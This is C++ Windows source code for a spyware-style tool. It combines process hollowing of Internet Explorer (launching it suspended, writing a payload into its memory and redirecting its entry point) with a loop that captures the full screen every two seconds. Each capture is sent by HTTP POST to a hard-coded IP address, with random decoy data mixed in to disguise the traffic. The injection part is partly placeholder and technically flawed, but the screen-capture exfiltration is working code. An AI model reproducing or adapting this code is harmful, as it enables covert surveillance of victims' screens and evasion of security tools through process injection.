#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <thread>

#pragma comment(lib, "wininet.lib")

const int screenWidth = GetSystemMetrics(SM_CXSCREEN);
const int screenHeight = GetSystemMetrics(SM_CYSCREEN);
const int bitsPerPixel = 32;
const int imageSize = screenWidth * screenHeight * (bitsPerPixel / 8);

char* allocatedMemory = nullptr;
char* fakeData = nullptr;

// Function to perform process hollowing
void HollowProcess(const char* targetProcess, const char* payloadData, SIZE_T payloadSize) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Start the target process in a suspended state
    if (!CreateProcess(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to create process." << std::endl;
        return;
    }

    // Get the address of the entry point
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // Replace the process memory with our payload
    LPVOID targetAddress = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, targetAddress, payloadData, payloadSize, NULL);

    // Set the entry point to our payload and resume the process
    ctx.Eax = (DWORD)targetAddress; // Assuming 32-bit; for 64-bit, use Rcx/Rip
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

// Function to capture a screenshot and store it in memory using user32.dll and gdi32.dll
bool CaptureScreenshotToMemory() {
    HMODULE user32 = LoadLibrary("user32.dll");
    HMODULE gdi32 = LoadLibrary("gdi32.dll");

    if (!user32 || !gdi32) {
        std::cerr << "Failed to load necessary libraries." << std::endl;
        return false;
    }

    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = { 0 };
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = screenWidth;
    bi.biHeight = -screenHeight; // Negative height for top-down DIB
    bi.biPlanes = 1;
    bi.biBitCount = bitsPerPixel;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = imageSize;

    GetDIBits(hMemoryDC, hBitmap, 0, screenHeight, allocatedMemory, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    FreeLibrary(user32);
    FreeLibrary(gdi32);

    return true;
}

// Function to send the screenshot data over HTTP using wininet.dll
bool SendScreenshot(const char* serverUrl, bool useFakeData) {
    HINTERNET hInternet = InternetOpen("HttpSender", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hConnect = InternetConnect(hInternet, serverUrl, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    const char* acceptTypes[] = { "application/json", NULL };
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/upload", NULL, NULL, acceptTypes, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    char* dataToSend = useFakeData ? fakeData : allocatedMemory;
    std::string headers = "Content-Type: application/octet-stream\r\n";
    if (!HttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)dataToSend, imageSize)) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return true;
}

// Function to repeatedly capture and send screenshots every 2 seconds
void TimerFunction(const char* serverUrl) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
        bool useFakeData = (rand() % 2 == 0); // Randomly decide whether to use fake data

        if (!useFakeData) {
            CaptureScreenshotToMemory();
        }

        SendScreenshot(serverUrl, useFakeData);
    }
}

int main() {
    allocatedMemory = new char[imageSize];
    fakeData = new char[imageSize];

    // Initialize fake data with arbitrary content
    memset(fakeData, 0xAB, imageSize);

    const char* serverUrl = "192.168.1.100"; // Target computer IP address

    // Hollow a legitimate process that uses wininet.dll, e.g., iexplore.exe or msedge.exe
    const char* targetProcess = "C:\\Program Files\\Internet Explorer\\iexplore.exe";
    const char* payload = "Payload to be injected";
    SIZE_T payloadSize = strlen(payload) + 1;

    HollowProcess(targetProcess, payload, payloadSize);

    std::thread timerThread(TimerFunction, serverUrl);
    timerThread.join();

    delete[] allocatedMemory;
    delete[] fakeData;

    return 0;
}
